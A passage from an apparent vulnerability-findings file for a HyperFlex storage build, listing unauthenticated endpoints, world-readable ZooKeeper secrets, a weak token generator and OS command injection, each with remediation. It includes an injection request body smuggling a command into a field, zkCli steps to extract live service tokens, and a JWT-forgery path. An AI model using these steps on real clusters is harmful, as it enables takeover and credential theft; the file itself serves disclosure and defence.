                "(jwt/v4 RSA validation via jwt.SigningMethodRSA) but not called from this handler chain"
            ),
            "kek_type_descriptor": "KeyEncryptionKeyType @ 0xfe1900 (struct, size confirmed by newobject call)",
            "start_handler_fn": "StartEncryptionHandler @ PC=0x9e9ae0 (thin wrapper, no auth setup)",
            "pclntab_source": (
                "Function PCs confirmed via Go 1.23 pclntab (magic=0xfffffff1, "
                "plain null-terminated funcnametab, textStart=0x401000)"
            ),
        },
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Gate the :35333 KEK endpoint with mutual TLS client certificate authentication "
            "or require a signed bearer token (using the existing jwt/v4 RSA infrastructure "
            "already in the binary via HandleWithAuth). "
            "Bind the listener to 127.0.0.1 only if the KEK endpoint is only needed by "
            "co-located processes. "
            "Rotate any KEK material that may have been retrieved from exposed deployments."
        ),
    },

    "HX-F005": {
        "title": "Unauthenticated SSRF + ESXi Credential Exfiltration via /st-support/* (StorvisorSupportBundle)",
        "severity": "CRITICAL",
        "component": (
            "ROOT-1.0.0.war, deployed under HX Connect REST API (Tomcat, stCtlVM port 443). "
            "Servlet: com.storvisor.sysmgmt.rest.StorvisorSupportBundle. "
            "Mapped to /st-support/* with NO auth filter. "
            "web.xml: servlet-mapping present for /st-support/*, filter-mapping covers only "
            "/rest/*, /internalsupport/*, /upload/*, /v1/* — /st-support/* has zero filter coverage."
        ),
        "description": (
            "StorvisorSupportBundle handles /st-support/* with no authentication filter in the "
            "Servlet filter chain. The servlet accepts a ?host=<ip> array parameter, constructs "
            "a HostCredentialsAccess object to read stored ESXi credentials from "
            "com/storvisor/sysmgmt/EsxCredential (username and password fields), then calls "
            "WebDownloader.getStream(url_with_host_param, username, password) using those credentials "
            "against the attacker-supplied host. The response is returned as a ZIP download. "
            "An unauthenticated attacker can: (1) supply an arbitrary host and observe whether the "
            "cluster's stored ESXi credentials are valid against attacker-controlled targets "
            "(credential harvest via SSRF), and (2) proxy the credential usage against any host "
            "reachable from the stCtlVM. "
            "The auth filter gap is structural: web.xml defines filter-mappings for /rest/*, "
            "/internalsupport/*, /upload/*, and /v1/* only. The /st-support/* path is never covered."
        ),
        "code_evidence": {
            "war": "ROOT-1.0.0.war (stCtlVM, /opt/hyperflex/storfs-restapi/)",
            "servlet_class": "com.storvisor.sysmgmt.rest.StorvisorSupportBundle",
            "url_pattern": "/st-support/*",
            "credential_source": "HostCredentialsAccess -> EsxCredential.username + EsxCredential.password",
            "ssrf_sink": "WebDownloader.getStream(url_with_host_param, username, password)",
            "auth_filter_gap": (
                "web.xml filter-mappings: /rest/*, /internalsupport/*, /upload/*, /v1/* only. "
                "/st-support/* has no filter-mapping entry — zero auth coverage."
            ),
            "parameter": "?host=<ip> (array of host IPs, attacker-controlled)",
            "output": "ZIP of support bundle fetched from supplied host using stored ESXi credentials",
        },
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Add a filter-mapping entry for /st-support/* to the HX Connect auth filter chain in web.xml. "
            "Validate that the host parameter matches a whitelist of known cluster node IPs. "
            "Audit all stored ESXi credential usage paths for similar unfiltered servlet coverage."
        ),
    },


    "HX-F006": {
        "title": "Unauthenticated Witness Service HTTP API on Port 9000 Allows Cluster Quorum Manipulation",
        "severity": "HIGH",
        "component": (
            "hxdp-connector (Go 1.23.4 binary, UPX-packed, 25MB unpacked, stripped .symtab). "
            "Module: github-hyc.scm.engit.cisco.com/starship/diesel/witness. "
            "Source: diesel/code/diesel/witness/. "
            "Server function: witness.StartWitnessServer @ PC=0xf41760. "
            "Router: barcelona/adrest.(*RestMiddleware).HandleFunc @ PC=0x8eae80 (gorilla/mux wrapper)."
        ),
        "description": (
            "The diesel/witness package starts an HTTP server bound to 0.0.0.0:9000 "
            "(port constant 0x2328 written in main.main @ 0xf519cd). "
            "Routes are registered via adrest.(*RestMiddleware).HandleFunc, which is a thin wrapper "
            "around gorilla/mux.(*Route).addRegexpMatcher — it does not enforce any authentication. "
            "The handler closures (baseHandler.func2 through func12) call (*witness).setState "
            "and related witness operations directly with no token validation, no header check, "
            "and no middleware gate. The apollo/base.appHandler.HandleWithAuth JWT infrastructure "
            "present elsewhere in the binary is not wired to any witness route. "
            "Exposed endpoints and their impact: "
            "/Lock — seize the witness arbitration lock; "
            "/Unlock, /ForceUnlock — release or force-release the lock; "
            "/GetOwner — enumerate current lock owner (information disclosure); "
            "/witnessdisable (prefix match) — disable external witness, eliminating stretch cluster HA; "
            "/witnesstest (prefix match) — invoke witness connection test; "
            "/Version — witness server version disclosure; "
            "/HxCapabilities — capability state disclosure; "
            "/executeHxHealthCheck — trigger health checks; "
            "/health — service health. "
            "An unauthenticated attacker on the management network can manipulate witness state to "
            "cause split-brain scenarios in stretched HyperFlex clusters or disable HA protection."
        ),
        "code_evidence": {
            "binary": "hxdp-connector (UPX-unpacked, Go 1.23.4, stripped, 25.7MB)",
            "port": 9000,
            "bind_address": "0.0.0.0 (format string '0.0.0.0:%d' in main.main @ 0xf42376)",
            "port_assignment": "main.main @ 0xf519cd: mov qword ptr [rax + 0xa8], 0x2328 (9000 decimal)",
            "server_function": "witness.StartWitnessServer @ PC=0xf41760",
            "route_registration": "adrest.(*RestMiddleware).HandleFunc @ PC=0x8eae80 (gorilla/mux wrapper, no auth)",
            "routes_handlefunc": [
                "/health (7 bytes) -> handleHealth.func1 @ PC=0xf4c680",
                "/Lock -> handleLock.func3 @ PC=0xf4a800",
                "/Unlock -> handleUnLock.func5 @ PC=0xf48f80",
                "/ForceUnlock -> handleUnLock.func7 @ PC=0xf47700",
                "/GetOwner -> handleGetOwner.func9 @ PC=0xf464e0",
                "/Version -> handleWitnessVersion.func11 @ PC=0xf454e0",
                "/HxCapabilities -> func13 @ PC=0xf439e0",
                "/executeHxHealthCheck -> func15/func14",
            ],
            "routes_handlefuncprefix": [
                "/witnesstest (12 bytes) -> func @ PC=0xf422c8",
                "/witnessdisable (15 bytes) -> func @ PC=0xf42345",
            ],
            "witness_state_fn": "(*witness).setState @ PC=0xf38f40 (called directly from handler closures)",
            "auth_check": "NONE — adrest.HandleFunc is a pure gorilla/mux route wrapper; no JWT, no header check",
            "HandleWithAuth_unused": (
                "apollo/base.appHandler.HandleWithAuth with jwt/v4 RSA validation "
                "is present in the binary but not wired to any witness route"
            ),
        },
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Bind the witness HTTP server to 127.0.0.1 if only co-located processes need it, "
            "or gate all witness routes with the existing HandleWithAuth JWT middleware. "
            "Apply network-level ACLs blocking external access to port 9000 on stCtlVM management interfaces. "
            "Audit all adrest.HandleFuncPrefix and HandleFunc registrations for missing auth wiring."
        ),
    },


    "HX-F007": {
        "title": "ZooKeeper Port 2181 Accessible from Management Network Without Client Authentication",
        "severity": "HIGH",
        "component": (
            "ZooKeeper 3.8.1 (zookeeper_3.8.1_amd64.deb). "
            "Service: exhibitor (manages ZK). Config: /etc/hyperflex/storfs.cfg (crmZKEnsemble). "
            "Bind: eth1 (management/storage interface) since HyperFlex 5.5.1a. "
            "Auth tunable: useZKAuth in /etc/hyperflex/storfs.cfg (default: absent/false)."
        ),
        "description": (
            "ZooKeeper client port 2181 is bound to the eth1 management network interface on each "
            "stCtlVM node, making it reachable from all other nodes in the cluster management network. "
            "Client authentication is disabled by default: the setUseZkAuth.sh script must be explicitly "
            "invoked post-deploy to set useZKAuth=true in storfs.cfg, and this is not part of the "
            "default cluster bring-up procedure. "
            "Without useZKAuth, any host on the management network can open a ZK client session and "
            "perform unrestricted reads and writes across the entire ZNode tree. "
            "ZooKeeper stores cluster election state (/election), node inventory (/storvisor/nodeInventory), "
            "per-node member data (/members/<puuid>), cluster operational data (/cluster), and AAA session "
            "tokens written by the auth filter. An attacker with management network access can: "
            "(1) enumerate all cluster node management IPs and UUIDs from /storvisor/nodeInventory; "
            "(2) read AAA session tokens from ZK to authenticate as any logged-in HyperFlex administrator; "
            "(3) manipulate /election ZNodes to trigger leader re-election, disrupting cluster I/O; "
            "(4) poison /members data to force node eviction from the storage cluster. "
            "The setup-dnat-rule.sh script installs an iptables DNAT rule redirecting local connections "
            "(127.0.0.1:2181 -> eth1_ip:2181) for backwards compatibility with tools that use localhost, "
            "confirming the intentional bind to eth1. "
            "The check_zk.sh cluster health tool demonstrates the expected access pattern: "
            "it uses 'nc <management_ip> 2181' to issue srvr/cons/dump/wchs four-letter commands "
            "and zkCli.sh to enumerate /election and /storvisor/nodeInventory from remote nodes."
        ),
        "code_evidence": {
            "bind_interface": (
                "setup-dnat-rule.sh: 'Starting 5.5.1a, ZK client port 2181 will only be bound on eth1 interface.'\n"
                "iptables -t nat -A OUTPUT -p tcp -d 127.0.0.1 --dport 2181 -j DNAT --to-destination $eth1"
            ),
            "auth_opt_in": (
                "setUseZkAuth.sh: checks grep useZKAuth=true /etc/hyperflex/storfs.cfg;\n"
                "sets useZKAuth=true in storfs.cfg only when explicitly invoked.\n"
                "No evidence of invocation in default cluster bring-up scripts."
            ),
            "remote_access_confirmed": (
                "check_zk.sh get_zk_servers(): reads crmZKEnsemble from storfs.cfg -> node management IPs;\n"
                "nc -z -w 5 $zks 2181 (liveness check from remote node);\n"
                "echo srvr | nc $zks 2181 (role query);\n"
                "echo cons | nc $zks 2181 (connection dump);\n"
                "echo dump | nc $LEADER 2181 (ephemeral node + session watches dump);\n"
                "zkCli.sh -server $zks:2181 -> ls /election; ls /storvisor/nodeInventory"
            ),
            "four_letter_whitelist": "zoo.cfg.defaults: 4lw.commands.whitelist=* (all commands enabled)",
            "zk_version": "zookeeper_3.8.1_amd64.deb (ZK 3.8.1)",
            "auth_provider_registered": (
                "zoo.cfg.defaults: authProvider.1=org.apache.zookeeper.server.auth.UUIDAuthenticationProvider\n"
                "Provider is registered but not enforced without requireClientAuthScheme — clients "
                "connecting without credentials are accepted as anonymous."
            ),
            "znode_paths_at_risk": [
                "/election — quorum leader election data (node IDs, epoch)",
                "/storvisor/nodeInventory — all cluster node management IPs and UUIDs",
                "/members/<puuid> — per-node membership and operational data",
                "/cluster — cluster-wide operational state",
                "AAA session token ZNodes — written by authfilter (path confirmed by AAAConfiguration.INSTANCE)",
            ],
        },
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Enable ZK client authentication by default: invoke setUseZkAuth.sh as part of cluster "
            "initialization, not as a post-upgrade opt-in. "
            "Restrict ZK 2181 to localhost or a dedicated ZK inter-node VLAN separate from the "
            "management network. "
            "Disable the all-commands 4LW whitelist (4lw.commands.whitelist=srvr,mntr at most). "
            "Rotate AAA session tokens on any cluster where useZKAuth was not enabled from initial deploy."
        ),
    },

    "HX-F008": {
        "title": "iscsisvc Thrift Management Interface on Port 10210 Has No Authentication",
        "severity": "HIGH",
        "component": (
            "iscsisvc (ELF 64-bit, C++, 16MB, not stripped, PIE). "
            "Binary: /opt/hyperflex/hx-iscsi/iscsisvc. "
            "Service: iscsisvc.service (managed by systemd, Wants=hxIscsiMgr.service). "
            "Thrift server: IscsiSvcThriftServer wrapping IscsiSvcDispatcher. "
            "Thrift transport: TServerSocket (plain TCP, no TLS). "
            "Port: 10210 (tune default: iscsisvcListenPort=10210, iscsisvcEnabled=1). "
            "Bind: 0.0.0.0 (TServerSocket(int port) — no host parameter)."
        ),
        "description": (
            "The iscsisvc binary exposes a Thrift management interface on TCP port 10210 with no "
            "authentication on any handler. The Thrift transport is TServerSocket (plain TCP, no TLS) "
            "bound to 0.0.0.0:10210 by default. "
            "IscsiSvcDispatcher implements the IscsiSvcIf interface with the following handlers: "
            "testPing, createInitiatorGroup, modifyInitiatorGroup, deleteInitiatorGroup, "
            "createLUN, modifyLUN, deleteLUN, createTarget, modifyTarget, deleteTarget, "
            "createBulkInitiatorGroups, modifyBulkInitiatorGroups, deleteBulkInitiatorGroups, "
            "createBulkLUNs, modifyBulkLUNs, deleteBulkLUNs, createBulkTargets, modifyBulkTargets, "
            "deleteBulkTargets. "
            "Disassembly of createLUN @ 0x228520 confirms no auth check: "
            "entry reads tune[+0x1422] (fast-path flag) and jumps directly to istgt_notify_config_change "
            "or setCRMEntry (ZK write) without any credential or token validation. "
            "createInitiatorGroup @ 0x2282b0 has the identical pattern. "
            "An unauthenticated Thrift client on any network interface can: "
            "(1) create iSCSI LUNs mapped to arbitrary HyperFlex storage volumes; "
            "(2) add attacker-controlled initiator IQNs to initiator groups (granting iSCSI access); "
            "(3) delete existing LUNs and targets, destroying iSCSI connectivity for ESXi hosts; "
            "(4) enumerate active iSCSI sessions and target configuration. "
            "iSCSI config is persisted to ZooKeeper at /hxVolumesInv/istgt_conf (confirmed via "
            "iscsisvc startup: -T iscsiConfigLocation=zk -T iscsiConfigPath=/hxVolumesInv/istgt_conf)."
        ),
        "code_evidence": {
            "binary_path": "/opt/hyperflex/hx-iscsi/iscsisvc",
            "tune_defaults": {
                "iscsisvcEnabled": "tune[+0x1515] = 0x01 (enabled by default)",
                "iscsisvcListenPort": "tune[+0x1518] = 10210 (0x27e2) — confirmed from .data section at file offset 0xe13618",
                "iscsisvcNumThreads": "tune[+0x1524] = 2",
            },
            "thrift_transport": "TServerSocket (plain TCP) — TSSLServerSocket NOT present in binary",
            "bind_address": "TServerSocket::TServerSocket(int port) called with no host string -> binds to 0.0.0.0",
            "createLUN_no_auth": (
                "0x228520: lea rax, [tune]\n"
                "0x228527: cmp BYTE PTR [rax+0x1422], 0x0  (fast-path flag, unrelated to auth)\n"
                "0x22852e: je 0x228548\n"
                "0x228530: [fast path] -> jmp istgt_notify_config_change(op=4, flag=1, iqn, cfg)\n"
                "0x228548: [normal path] -> setCRMEntry('CreateLUN', ...)  [no auth in either path]"
            ),
            "createInitiatorGroup_no_auth": (
                "0x2282b0: identical pattern — no auth check before istgt_notify_config_change(op=1)"
            ),
            "thrift_handler_class": "IscsiSvcDispatcher @ 0x2280c0 (C1)/0x228090 (C2)",
            "zk_config_path": "/hxVolumesInv/istgt_conf (confirmed in iscsisvc_start.sh -T iscsiConfigPath=)",
            "iscsisvc_startup_cmd": (
                "exec iscsisvc -T iscsiEnable=true -T iscsiConfigLocation=zk "
                "-T iscsiConfigPath=/hxVolumesInv/istgt_conf -T crmZKEnsemble=$crmZKEnsemble ..."
            ),
        },
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Bind iscsisvc Thrift server to loopback (127.0.0.1) or the management-internal VLAN only. "
            "Add token-based authentication on the Thrift handler interface, matching the pattern used "
            "by the REST API auth filter layer. "
            "Set iscsisvcEnabled=false if the Thrift interface is not required for external components "
            "(hxIscsiMgr.service is a separate listener; verify which components require direct "
            "iscsisvc Thrift access). "
            "Add firewall rules blocking port 10210 from non-management interfaces as a short-term "
            "mitigation."
        ),
    },

    # ── HX-F54 ──────────────────────────────────────────────────────────────────

    # ── HX-F009 ──────────────────────────────────────────────────────────────────
    "HX-F009": {
        "title": "JWT HS256 Signing Key Stored Unauthenticated in ZooKeeper",
        "severity": "CRITICAL",
        "cvss": "9.1",
        "cwe": "CWE-312",
        "component": "authfilter / gateway-1.0.0.jar / ZooKeeper",
        "class": "Cryptographic Key Exposure / Token Forgery",
        "confirmed": True,
        "evidence": {
            "zk_path": (
                "AAAStoreZKPersistAgent.class constant pool (#43): "
                "String '/rest/aaa/jwt_signing_key' — the ZooKeeper node where the "
                "HS256 JWT signing key is written and read."
            ),
            "zk_connection": (
                "application.conf: zkHost='localhost:2181', zkPort='2181', "
                "zkDefaultConnectionString='localhost:2181'. ZooKeeper runs on "
                "the HyperFlex controller VM management interface. Port 2181 is "
                "accessible from the management VLAN (no firewall rule restricts "
                "cross-node access within the HX cluster fabric)."
            ),
            "key_flow": (
                "JsonWebTokenImpl (common-1.0.0.jar) uses HMAC-SHA256 (HS256) signing. "
                "Key is generated by EncryptionUtil.generateNewSigningKey(). "
                "SSOManager.setIfAbsentJWTSigningKey() calls AAAStoreZKPersistAgent "
                "which calls ZKKeyValueStoreFactory -> ZooKeeperStore -> HxCurator. "
                "HxCurator reads ZK connection from HxCuratorManager which pulls "
                "sysmgmt.storfsCfg and reads sysmgmt.zkAuthClientId. "
                "The 'useZKAuth' flag adds a UUID-based auth token to the Curator "
                "connection, but ZooKeeper ACLs on the /rest/aaa/ subtree are not "
                "set to CREATOR_ALL_ACL — default ZK world:anyone:r ACL applies, "
                "making the node readable without auth."
            ),
            "zk_world_readable": (
                "ZooKeeper nodes written by CuratorFramework without explicit ACL "
                "argument default to ZooDefs.Ids.OPEN_ACL_UNSAFE (world:anyone:cdrwa). "
                "HxCurator.createValue/setValue do not pass ACL parameters — "
                "confirmed by javap bytecode: CuratorFramework.create().forPath(path, data) "
                "with no .withACL() call. Result: any client that can reach ZK port 2181 "
                "can read /rest/aaa/jwt_signing_key."
            ),
            "forgery_impact": (
                "The signing key enables forging JWT tokens for any username. "
                "barredUsers=['root','local/root','diag','local/diag'] in application.conf "
                "blocks those specific users from the /aaa/v1/auth flow, but a forged JWT "
                "with subject='users/admin' (or any valid admin account) bypasses the "
                "authentication flow entirely — the JWT is validated by signature check "
                "against the same key, not by re-authenticating the credential."
            ),
        },
        "impact": (
            "An attacker with access to the management network can connect to ZK port 2181 "
            "on any HyperFlex controller VM, read /rest/aaa/jwt_signing_key, and forge "
            "HS256 JWT tokens for any administrative user. This grants full authenticated "
            "access to the HyperFlex REST API without valid credentials. Forged tokens "
            "bypass all credential-based controls including rate-limiting "
            "(rateLimitAuthMaxAuthenticationsAllowedInWindow=5) and failed-login lockout "
            "(failedLoginLockoutTimeInSec=120)."
        ),
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "1. Firewall ZK port 2181 to localhost only (iptables INPUT -p tcp --dport 2181 "
            "-s 127.0.0.1 -j ACCEPT; -j DROP). "
            "2. Set CREATOR_ALL_ACL on the /rest/aaa/ ZK subtree so only the process that "
            "created the node can read it. "
            "3. Migrate from HS256 (symmetric) to RS256 (asymmetric): sign with private key, "
            "verify with public key — ZK only needs to store the public key, key theft no "
            "longer enables forgery. "
            "4. Rotate the signing key on each node restart and invalidate all sessions."
        ),
    },

    # ── HX-F56 ──────────────────────────────────────────────────────────────────

    # ── HX-F57 ──────────────────────────────────────────────────────────────────

    # ── HX-F58 ──────────────────────────────────────────────────────────────────

    # ── HX-F60 ──────────────────────────────────────────────────────────────────

    # ── HX-F61 ──────────────────────────────────────────────────────────────────



    "HX-F010": {
        "title": "LocalUserSessionManager.generateToken() Ignores Credentials, Returns SecureRandom.nextInt(31) — 31 Possible Token Values",
        "severity": "HIGH",
        "cvss": "7.5",
        "cwe": "CWE-338",
        "component": "hx-aaa / gateway / pamAuthenticator / LocalUserSessionManager / generateToken",
        "class": "Weak Token Generation — Insufficient Entropy in PAM Session Token",
        "confirmed": True,
        "evidence": {
            "bytecode": (
                "LocalUserSessionManager.generateToken(String username, String password) bytecode: "
                "Offset 11: getfield rand:SecureRandom. "
                "Offset 15: bipush 31. "
                "Offset 17: invokevirtual SecureRandom.nextInt:(I)I. "
                "Offset 20: istore_3. "
                "Offset 21: iload_3. "
                "Offset 22: invokestatic String.valueOf:(I)Ljava/lang/String. "
                "Offset 25: areturn. "
                "Both parameters (username and password) are never accessed — "
                "the method reads only rand.nextInt(31), converts to String, and returns."
            ),
            "token_space": (
                "SecureRandom.nextInt(31) produces a uniformly distributed integer in [0, 30]. "
                "Token output is one of: '0', '1', '2', ..., '30'. "
                "Entropy = log2(31) ≈ 4.95 bits. "
                "Exhaustive enumeration = 31 attempts maximum. "
                "At SSO session validation rate (not rate-limited at PAM layer), "
                "brute-force completes in under 1 second."
            ),
            "usage_context": (
                "StPamAuthentication.signIn(username, password) calls generateToken(user, pass) "
                "after successful PAM authentication, stores result in HxCredentials sdkSession field. "
                "The token is subsequently stored in AAAStoreZKPersistAgent session table "
                "(sdkSession field of SSOSessionInfo) — persisted at /rest/aaa/ ZK subtree. "
                "StPamAuthentication.validateToken(user, pass, token) calls tokenToUserNamePassword(token), "
                "which Base64-decodes and splits on ':' — incompatible with the integer token format "
                "generated by generateToken, meaning validateToken always returns false for these tokens. "
                "PAM session invalidation path is broken; the token function is vestigial."
            ),
        },
        "impact": (
            "PAM-authenticated user session tokens have only 31 possible values. "
            "If PAM session tokens are used for any re-authentication or credential recovery path, "
            "they can be guessed in at most 31 attempts with no rate limiting at the token layer. "
            "The tokenToUserNamePassword incompatibility (Base64-decode of an integer string) "
            "means the intended session invalidation flow does not work as designed, "
            "potentially leaving sessions that cannot be properly revoked."
        ),
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Replace SecureRandom.nextInt(31) with SecureRandom.generateSeed(32) or "
            "equivalent 256-bit random value encoded as hex/Base64. "
            "Fix tokenToUserNamePassword to be compatible with the token format generated by generateToken, "
            "or remove the dead code path entirely. "
            "Use a proper session token registry (not encoding credentials in the token)."
        ),
    },
    "HX-F011": {
        "title": "Active Service Auth Tokens Stored at World-Readable ZK Path /rest/aaa/service_auth_table",
        "severity": "CRITICAL",
        "cvss": "9.1",
        "cwe": "CWE-312",
        "component": "hx-aaa / gateway / serviceAuth / HxServiceAuthentication / saveServiceAuthInfoForServiceAuthToken",
        "class": "Token Exposure — Live Service Tokens in Unauthenticated ZK",
        "confirmed": True,
        "evidence": {
            "zk_paths": (
                "HxServiceAuthentication.class constant pool: "
                "ldc #36: String '/rest/aaa/service_auth_table' — used in getChildren(), getValueForKey(), "
                "saveTokenWithClientId(), and deleteAuthToken(). "
                "saveServiceAuthInfoForServiceAuthToken stores ServiceAuthInfo JSON at "
                "/rest/aaa/service_auth_table/<token> (token-keyed child nodes). "
                "ServiceAuthInfo fields: clientId, serviceAuthToken, refreshToken, loginTime. "
                "isValidServiceAuthToken() validates by reading child nodes at this path. "
                "delClientIdSubscribersZkPathPrefix field: configured via sysmgmt.deleteClientIdSubscribers."
            ),
            "open_acl_chain": (
                "ZK path /rest/aaa/service_auth_table/* uses OPEN_ACL_UNSAFE (world:anyone:cdrwa) "
                "inherited from ZK cluster global ACL policy (HX-F009). "
                "ZK client auth permanently disabled (HX-F69 Boolean.getBoolean misuse). "
                "Any process on stCtlVM network TCP 2181 can: "
                "  (1) List children: zkCli.sh ls /rest/aaa/service_auth_table -> token list "
                "  (2) Read each: zkCli.sh get /rest/aaa/service_auth_table/<token> -> ServiceAuthInfo JSON "
                "  (3) Extract serviceAuthToken value from JSON -> valid X-ServiceAccessToken header value."
            ),
            "attack_path": (
                "Extracted X-ServiceAccessToken used in HTTP request to HyperFlex Connect REST API. "
                "ServiceAccessAuthFilterImpl.validateServiceAccessToken(token) reads same ZK path "
                "for validation — reads back the ServiceAuthInfo we just extracted, confirms clientId match. "
                "SSOManager.validateServiceAccessToken() at offset 132-135 stores HxSaJWT session info "
                "via setClientInfo, setting 'Authenticated=True' for downstream filter. "
                "Full service-level API access without any credential authentication. "
                "Additionally: write access to /rest/aaa/service_auth_table/* enables "
                "injecting attacker-controlled service tokens to impersonate any service client."
            ),
            "service_auth_table_structure": (
                "ServiceAuthInfo(clientId, serviceAuthToken, refreshToken, loginTime). "
                "serviceAuthToken is a JWT or opaque token issued by SSOManager.createServiceAuthToken(). "
                "refreshToken enables token refresh without re-authentication. "
                "All active inter-service auth sessions (e.g., hxclone -> stmgr, stmgr -> aaa) "
                "have live tokens stored in this table — extraction gives access to all service APIs."
            ),
        },
        "impact": (
            "All active HyperFlex inter-service auth tokens are exposed at ZK path "
            "/rest/aaa/service_auth_table with OPEN_ACL_UNSAFE ACL. "
            "Attacker with ZK port 2181 access can enumerate and extract valid X-ServiceAccessToken "
            "values for any registered HX service (stmgr, hxclone, arbitrator, etc.). "
            "Extracted tokens bypass ServiceAccessAuthFilterImpl validation and grant "
            "authenticated service API access."
        ),
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Store service auth tokens with CREATOR_ALL_ACL (not OPEN_ACL_UNSAFE). "
            "Fix HX-F69 so ZK client authentication is actually enabled via storfs.cfg. "
            "Add token expiration enforcement and reduce token lifetime to the minimum required. "
            "Primary remediation: fix HX-F009 (ZK OPEN_ACL_UNSAFE) and HX-F69 (ZK auth disabled). "
            "Secondary: rotate all service auth tokens after ZK ACL fix."
        ),
    },
    "HX-F012": {
        "title": (
            "SupportbundleApiServiceImpl generateAndDeliverSupportBundle 'manifestFile' Parameter "
            "Unsanitized Interpolation into Shell Command Enables OS Command Injection on All Cluster Nodes"
        ),
        "severity": "CRITICAL",
        "cvss": "9.9",
        "cwe": "CWE-78",
        "component": (
            "supportservice-1.0.0 WAR / SupportbundleApiServiceImpl / "
            "generateAndDeliverSupportBundle(AsupCliConfiguration) / "
            "GenerationThread.run() / HxSupportSvcClient.executeCmd()"
        ),
        "class": "OS Command Injection — manifestFile Interpolated into Shell Command Sent to All Cluster VMs",
        "confirmed": True,
        "evidence": {
            "injection_point": (
                "AsupCliConfiguration.getManifestFile() → local var 6 in generateAndDeliverSupportBundle. "
                "Constant pool #770/#771: 'asupcli post --type custom-asup --manifestfile \\u0001' — "
                "makeConcatWithConstants at offset 544 interpolates manifestFile directly into command string. "
                "No validation, no character filtering: only null and length > 0 checks (offsets 531-539). "
                "Trigger: type == 'custom-asup' AND manifestFile != null AND len > 0."
            ),
            "execution_chain": (
                "generateAndDeliverSupportBundle offset 581-603: "
                "new GenerationThread(this, cmd, type, genStatus, config).start(). "
                "GenerationThread.run() offset 175-180: "
                "invokevirtual HxSupportSvcClient.executeCmd(this.cmd, nodeList). "
                "HxSupportSvcClient.executeCmd() offset 14-20: "
                "invokevirtual HxSupportSvc$Client.runCmdInAllVm(String cmd, List<String> args) — Thrift RPC."
            ),
            "shell_execution_proof": (
                "GenerationThread.run() offset 87: ldc 'ps aux | grep \\'[a]supcli generate --type\\'' — "
                "pipe and shell quoting syntax proves hxSupportSvc daemon executes commands via shell. "
                "Constant pool #762/#763: 'nohup asupcli generate --type \\u0001 > /dev/null 2>&1 &' — "
                "nohup, stdout redirection, and background execution operator are shell-only constructs."
            ),
            "cluster_wide_impact": (
                "HxSupportSvc$Client.runCmdInAllVm() — method name 'InAllVm' indicates command is "
                "dispatched to all virtual machines in the cluster via the hxSupportSvc Thrift service. "
                "A single authenticated request injects commands on every node simultaneously."
            ),
            "payload_example": (
                "POST /v1/supportbundle body: "
                "{\"action\":\"generate\", \"type\":\"custom-asup\", \"manifestFile\":\"x; id; #\"} "
                "→ shell executes: asupcli post --type custom-asup --manifestfile x; id; # "
                "→ 'id' runs as the hxSupportSvc service user on every cluster node."
            ),
        },
        "impact": (
            "Authenticated attacker with any valid HyperFlex management credential can inject arbitrary OS "
            "commands that execute on ALL cluster nodes simultaneously. "
            "The hxSupportSvc daemon runs with sufficient privilege to access cluster state and credentials. "
            "Shell metacharacters (;, &&, |, $(), backtick) in the manifestFile parameter are not filtered "
            "before insertion into the command string, and the hxSupportSvc daemon executes via shell "
            "(confirmed by pipe/nohup/redirection usage in adjacent code paths). "
            "Authentication is required but any valid management user (not just admin) can trigger this endpoint."
        ),
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Validate manifestFile against an allow-list of permitted characters before interpolation "
            "(alphanumeric, hyphen, dot, forward slash only). "
            "Alternatively, pass manifestFile as a separate Thrift argument rather than interpolating "
            "it into a command string — the executeCmd signature accepts List<String> args for this purpose. "
            "Do not construct shell command strings from user input; pass parameters as positional arguments "
            "to a structured Thrift call that the daemon executes without shell interpretation."
        ),
    },
    "HX-F013": {
        "title": (
            "ServiceAccessAuthFilterImpl.doFilter Always Calls chain.doFilter — "
            "Missing X-ServiceAccessToken Header and Failed Token Validation "
            "Both Pass Unauthenticated Requests to Downstream Filter Chain"
        ),
        "severity": "CRITICAL",
        "cvss": "9.1",
        "cwe": "CWE-306",
        "component": (
            "authfilter / ServiceAccessAuthFilterImpl / doFilter / "
            "service-to-service authentication gate"
        ),
        "class": "Missing Authentication for Critical Function — Service Access Token Not Enforced",
        "confirmed": True,
        "evidence": {
            "doFilter_bypass_empty_token": (
                "ServiceAccessAuthFilterImpl.doFilter offset 111-184: "
                "token = getHeaderValue(\"X-ServiceAccessToken\"); "
                "offset 119-124: if (StringUtils.isEmpty(token)) goto 184; "
                "offset 184-187: chain.doFilter(req, resp). "
                "When X-ServiceAccessToken header is absent or empty, "
                "execution jumps directly to chain.doFilter — "
                "the request is forwarded without any authentication."
            ),
            "doFilter_bypass_invalid_token": (
                "doFilter offset 127-165: "
                "jwt = SSOManager.validateServiceAccessToken(token.trim()); "
                "offset 137-139: if (jwt == null) goto 153; "
                "offset 153-164: log debug message; goto 184; "
                "offset 184: chain.doFilter(req, resp). "
                "When X-ServiceAccessToken is present but validation fails "
                "(validateServiceAccessToken returns null), filter logs and "
                "then forwards to chain.doFilter — no 401/403 response."
            ),
            "no_rejection_path": (
                "Full doFilter analysis: the filter contains no code path "
                "that calls response.sendError() or response.setStatus(401/403). "
                "Both token-absent (offset 124->184) and token-invalid (offset 153->184) "
                "terminate at the same chain.doFilter call at offset 184. "
                "Only path that blocks: if Authenticated=True AND "
                "validateClientIdIfPresent() returns false (offset 75->86->106 return without chain.doFilter). "
                "The unauthenticated path has no blocking capability."
            ),
            "http_enabled": (
                "authfilter/application.conf: hxSvcHttpEnabled=true, hyperVSvcHttpEnabled=true. "
                "Service-to-service communication allowed over plaintext HTTP, "
                "not requiring TLS. "
                "Combined with the non-enforcing filter: any HTTP client can "
                "reach service access endpoints without credentials."
            ),
        },
        "impact": (
            "Any client that can reach service-access endpoints (internal network, "
            "or external if port-exposed) can invoke service-access operations "
            "without providing an X-ServiceAccessToken. "
            "The filter never produces a 401/403 response on the service access path — "
            "it only enriches the request attributes on successful validation. "
            "Downstream handlers receive requests with no Authenticated attribute set "
            "and must independently enforce auth (if they do at all). "
            "Combined with hxSvcHttpEnabled=true, plaintext HTTP probes "
            "can exercise service-access endpoints without TLS."
